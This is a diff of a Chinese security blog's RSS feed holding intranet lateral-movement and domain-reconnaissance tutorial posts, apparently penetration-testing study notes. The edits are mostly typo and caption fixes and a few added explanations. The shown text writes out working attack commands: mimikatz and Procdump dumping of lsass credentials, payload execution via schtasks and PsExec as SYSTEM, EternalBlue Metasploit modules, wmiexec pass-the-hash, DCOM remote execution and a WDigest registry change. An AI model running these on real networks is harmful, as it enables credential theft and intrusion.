@@ -1575,7 +1575,7 @@ meterpreter &amp;gt; impersonate_token &amp;quot;PAYLOADS\\Administrator”
         <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
         
         <guid>https://coollllllll.github.io/p/intranet-15/</guid>
-        <description>&lt;img src="https://coollllllll.github.io/p/intranet-15/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 内网横向" /&gt;&lt;h1 id=&#34;内网横向&#34;&gt;内网横向&lt;/h1&gt;
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-15/haha.jpg" alt="Featured image of post 内网横向" /&gt;&lt;h1 id=&#34;内网横向&#34;&gt;内网横向&lt;/h1&gt;
 &lt;h2 id=&#34;windows-密码与-hash-抓取&#34;&gt;Windows 密码与 Hash 抓取&lt;/h2&gt;
 &lt;h3 id=&#34;mimikatz-直接读取明文密码&#34;&gt;mimikatz 直接读取明文密码&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
@@ -1596,9 +1596,9 @@ reg save hklm\system system.hive
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
 token::elevate
 lsadump::sam
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mimikatz-离线读取-lassdmp-文件&#34;&gt;mimikatz 离线读取 lass.dmp 文件&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mimikatz-离线读取-lsassdmp-文件&#34;&gt;mimikatz 离线读取 lsass.dmp 文件&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;使用Procdump(微软工具，免杀)工具导出 lass.dmp&lt;/li&gt;
+&lt;li&gt;使用Procdump(微软工具，免杀)工具导出 lsass.dmp&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Procdump.exe -accepteula -ma lsass.exe lsass.dmp
 &lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
@@ -1611,8 +1611,8 @@ sekurlsa::logonpasswords full
 &lt;p&gt;IPC$(Internet Process Connection) 是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;建立 ipc$ 连接的条件：&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;目标主机开启了139和445端口&lt;/li&gt;
-&lt;li&gt;目标主机管理员开启了ipc$默认共享&lt;/li&gt;
+&lt;li&gt;目标主机开启了 139 和 445 端口&lt;/li&gt;
+&lt;li&gt;目标主机管理员开启了 ipc$ 默认共享&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 通过账户:口令建立IPC
 net use \\IP\ipc$ &amp;quot;password&amp;quot; /user:&amp;quot;username&amp;quot;
@@ -1654,16 +1654,16 @@ copy C:\Users\douser\Desktop\shell.exe \\IP\c$
 &lt;li&gt;上线之后，删除计划任务&lt;/li&gt;
 &lt;/ul&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\IP taskid /delete
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;schtakss-命令&#34;&gt;schtakss 命令&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;schtasks-命令&#34;&gt;schtasks 命令&lt;/h3&gt;
 &lt;blockquote&gt;
-&lt;p&gt;schtasks命令比at命令更为灵活、自由，用以代替at。&lt;/p&gt;
+&lt;p&gt;schtasks 命令比 at 命令更为灵活、自由，用以代替 at。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;ul&gt;
 &lt;li&gt;建立IPC&lt;/li&gt;
 &lt;li&gt;复制马到目标主机&lt;/li&gt;
 &lt;li&gt;创建名为test的计划任务&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtask /create /s IP /tn test /sc minute /tr c:\payload.bat /ru system /f
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /create /s IP /tn test /sc minute /tr c:\payload.bat /ru system /f
 
 # minute表明每分钟执行一次
 # 创建失败，比如拒绝访问错误，就是权限不够，可以使用/u /p 参数附带高权限用户
@@ -1708,8 +1708,8 @@ kerberos::ptt C:\xxx.kirbi
 &lt;p&gt;psexec 是 windows 下非常好的一款远程命令行工具。属于微软官方，所以一般是免杀的。&lt;/p&gt;
 &lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;通过ipc$连接，释放二进制文件psexecsvc.exe到目标&lt;/li&gt;
-&lt;li&gt;通过服务管理SCManager远程创建一个psexec服务，并启动服务&lt;/li&gt;
+&lt;li&gt;通过 ipc$ 连接，释放二进制文件 psexecsvc.exe 到目标&lt;/li&gt;
+&lt;li&gt;通过服务管理 SCManager 远程创建一个 psexec 服务，并启动服务&lt;/li&gt;
 &lt;li&gt;客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据&lt;/li&gt;
 &lt;li&gt;运行结束后删除服务&lt;/li&gt;
 &lt;/ul&gt;
@@ -1725,7 +1725,7 @@ kerberos::ptt C:\xxx.kirbi
 &lt;li&gt;建立IPC&lt;/li&gt;
 &lt;li&gt;获取 System 权限的 交互式shell&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PsExec.exe -accepteula \\IP -s cmd.exe
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PsExec.exe -accepteula \\IP -u 用户名 -p 密码 -s cmd.exe
 
 # 直接执行命令
 PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig
@@ -1736,10 +1736,16 @@ PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig
 
 exploit/windows/smb/psexec_psh（powershell 版本）
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;永恒之蓝&#34;&gt;永恒之蓝&lt;/h2&gt;
+&lt;p&gt;针对 smb v1。&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;auxiliary/scanner/smb/smb_ms17_010
 auxiliary/admin/smb/ms17_010_command
 exploit/windows/smb/ms17_010_eternalblue
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wmi&#34;&gt;WMI&lt;/h2&gt;
+&lt;p&gt;通过 /node 选项使用端口 135 上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;条件：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标机开启了 135,445 端口（135 管理口，445 传回显）&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h3 id=&#34;基本使用&#34;&gt;基本使用&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:IP /user:administrator /password:passed process call create &amp;quot;cmd.exe /c ipconfig &amp;gt; ip.txt&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
@@ -1750,7 +1756,7 @@ exploit/windows/smb/ms17_010_eternalblue
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python wmiexec.py administrator:password@IP
 
 # 如果没有密码，也可以配合哈希传递
-wmiexec.py -hashes
+python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;smbexec&#34;&gt;smbexec&lt;/h2&gt;
 &lt;h3 id=&#34;impacket-版&#34;&gt;impacket 版&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
@@ -1759,6 +1765,11 @@ wmiexec.py -hashes
     &gt;https://github.com/brav0hax/smbexec&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;dcom&#34;&gt;DCOM&lt;/h2&gt;
 &lt;p&gt;DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;需要关闭目标系统的防火墙，如果目标主机 DC 没有关闭防火想的话会报错&lt;/li&gt;
+&lt;li&gt;在远程主机上执行命令时，必须使用具有本地管理员权限的账号&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h3 id=&#34;本地执行任意命令&#34;&gt;本地执行任意命令&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;获取 DCOM 程序列表&lt;/li&gt;
@@ -1774,13 +1785,6 @@ Get-WmicObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 本地管理员powershell下执行
 [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;127.0.0.1&amp;quot;)).Document.ActiveView.ExecuteShellCommand(&amp;quot;cmd.exe&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;Minimzed&amp;quot;)
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;远程主机上执行命令&#34;&gt;远程主机上执行命令&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;IPC连接&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\IP &amp;quot;password&amp;quot; /user:pentest.hacker\win7user
-&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
-&lt;li&gt;执行命令&lt;/li&gt;
-&lt;/ul&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 调用 MMC20_Application 远程执行命令
 $com=[Activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;MMC20.Application&amp;quot;,&amp;quot;IP&amp;quot;))
 $com.Document.ActiveView.ExecuteShellCommand(&amp;quot;cmd.exe&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;/c calc.exe&amp;quot;,&amp;quot;Minimzed&amp;quot;)
@@ -3497,7 +3501,7 @@ mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;1sadump::dcsync /use
         <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
         
         <guid>https://coollllllll.github.io/p/intranet-2/</guid>
-        <description>&lt;img src="https://coollllllll.github.io/p/intranet-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 域信息获取及分析" /&gt;&lt;h1 id=&#34;域信息获取及分析&#34;&gt;域信息获取及分析&lt;/h1&gt;
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-2/haha.jpg" alt="Featured image of post 域信息获取及分析" /&gt;&lt;h1 id=&#34;域信息获取及分析&#34;&gt;域信息获取及分析&lt;/h1&gt;
 &lt;h2 id=&#34;基础信息获取及分析&#34;&gt;基础信息获取及分析&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;当前主机所在域的域名、网段、域服务器&lt;/li&gt;
@@ -3521,8 +3525,10 @@ systeminfo
 			height=&#34;410&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205163617542_hu122519dfc983fbde1340ef8ac90c1792_9275_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205163617542_hu122519dfc983fbde1340ef8ac90c1792_9275_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205163617542&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205163617542&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;blockquote&gt;
@@ -3577,8 +3583,10 @@ net group &amp;quot;domain controllers&amp;quot; /domain
 			height=&#34;452&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180507399_hu3b2e019a91b05c897cdb43e16e0ca315_226741_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205180507399_hu3b2e019a91b05c897cdb43e16e0ca315_226741_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205180507399&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205180507399&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure 
@@ -3594,8 +3602,10 @@ net group &amp;quot;domain controllers&amp;quot; /domain
 			height=&#34;438&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205180653764_hu11ac7fe66e99589ec015b09209deba14_19852_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205180653764_hu11ac7fe66e99589ec015b09209deba14_19852_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205180653764&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205180653764&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;ul&gt;
@@ -3614,8 +3624,10 @@ net group &amp;quot;domain controllers&amp;quot; /domain
 			height=&#34;405&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205181053604_hua7c32bce22a9a4a38be3428f7ea060eb_16425_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205181053604_hua7c32bce22a9a4a38be3428f7ea060eb_16425_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205181053604&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205181053604&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;blockquote&gt;
@@ -3641,8 +3653,10 @@ net use \\DC.hack.testlab
 			height=&#34;48&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200746055_hu01f71a952a008d7b71ba46513152cab8_1257_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205200746055_hu01f71a952a008d7b71ba46513152cab8_1257_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205200746055&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205200746055&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查看共享资源
@@ -3660,8 +3674,10 @@ net view \\DC.hack.testlab
 			height=&#34;186&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205200907001_hu359df50a656de8027263bc76d80d25d9_4287_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205200907001_hu359df50a656de8027263bc76d80d25d9_4287_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205200907001&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205200907001&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 列出共享文件夹下的资源
@@ -3681,8 +3697,10 @@ dir \\DC.hack.testlab\sysvol\hack.testlab\Policies
 			height=&#34;169&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203133618_hu84356fee9f9c2e44a69386e07ad57547_3834_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205203133618_hu84356fee9f9c2e44a69386e07ad57547_3834_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205203133618&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205203133618&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure 
@@ -3698,8 +3716,10 @@ dir \\DC.hack.testlab\sysvol\hack.testlab\Policies
 			height=&#34;170&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205203342846_hudfb0d2c77125379cee31704ab98f4663_4948_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205203342846_hudfb0d2c77125379cee31704ab98f4663_4948_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205203342846&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205203342846&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 拷贝策略文件
@@ -3719,8 +3739,10 @@ xcopy.exe \\DC.hack.testlab\sysvol\hack.testlab\Policies . /E
 			height=&#34;646&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220205210156729_hu5ed5acf4060a0fb646fdd76425898c26_62311_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220205210156729_hu5ed5acf4060a0fb646fdd76425898c26_62311_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220205210156729&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220205210156729&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;h2 id=&#34;口令ntlm获取及分析&#34;&gt;口令NTLM获取及分析&lt;/h2&gt;
@@ -3742,10 +3764,35 @@ lsadump::lsa /patch //通过转储lsass.exe进程对散列值进行dump
 			height=&#34;80&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209212430445_hu62fa866f845f5d31d26c4e80e7fbc81a_1784_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220209212430445_hu62fa866f845f5d31d26c4e80e7fbc81a_1784_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220209212430445&#34;&gt;
 	&lt;/a&gt;
 	
+	&lt;figcaption&gt;image-20220209212430445&lt;/figcaption&gt;
+	
 &lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;工具原理&#34;&gt;工具原理&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;lsass.exe&lt;/code&gt;进程是负责 Windows 本地安全认证和登录策略，当某个用户处在登录状态，其登录的密码是保存在&lt;code&gt;lsass&lt;/code&gt;内存文件中，那么可以从&lt;code&gt;lsass&lt;/code&gt;内存文件中将明文密码直接读出。&lt;/p&gt;
+&lt;h4 id=&#34;kb2871997&#34;&gt;KB2871997&lt;/h4&gt;
+&lt;p&gt;该补丁有以下特性：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;支持受保护用户组&lt;/strong&gt;：Protected Users组是一个新的域全局安全组，所属用户会被强制要求使用 Kerberos 认证，并且对 Kerberos 强制执行AES加密。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;远程桌面客户端支持 Restricted Admin RDP 模式&lt;/strong&gt;：受限管理员模式能够避免发送明文，服务端也不会缓存用户凭据，但也存在 PTH 攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;LSA 凭据清理和其他更改&lt;/strong&gt;：从 LSASS 中删除了明文密码、用户注销后凭据从内存中清除(原本只要登录过就会缓存)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;添加两个新的SID&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;本地账户，LOCAL_ACCOUNT(s-1-5-113)，所有本地账户继承此 SID&lt;/li&gt;
+&lt;li&gt;本地管理员组，LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP(S-1-5-114)，所有本地管理员组继承此 SID&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在 KB2871997 后，Wdigest Auth 强制系统的内存不再保存明文口令，此时 mimikatz 无法获得系统的明文口令。但是当安装完补丁后，可以选择是否禁用 Wdigest Auth。&lt;/p&gt;
+&lt;p&gt;因此可以修改注册表去开启 Wdigest Auth：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;路径：HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+将 UseLogonCredential 选项值修改为 0(关闭Wdigest Auth)
+&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;影响范围：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;安装了 KB2871997 补丁或者系统版本大于 Windows Server 2012 时，系统的内存不保存明文密码。&lt;/p&gt;
 &lt;h2 id=&#34;安全日志获取及分析&#34;&gt;安全日志获取及分析&lt;/h2&gt;
 &lt;p&gt;所在路径：&lt;code&gt;C:\Windows\System32\winevt\Logs\Security.evtx&lt;/code&gt;，从日志中想要获得的相关信息：&lt;/p&gt;
 &lt;ul&gt;
@@ -3775,8 +3822,10 @@ lsadump::lsa /patch //通过转储lsass.exe进程对散列值进行dump
 			height=&#34;539&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-2/image-20220209213657423_hu40f05454449a4177a99bf3b23bbe857a_29833_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-2/image-20220209213657423_hu40f05454449a4177a99bf3b23bbe857a_29833_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			&gt;
+			alt=&#34;image-20220209213657423&#34;&gt;
 	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220209213657423&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;h4 id=&#34;log-parser&#34;&gt;Log Parser&lt;/h4&gt;
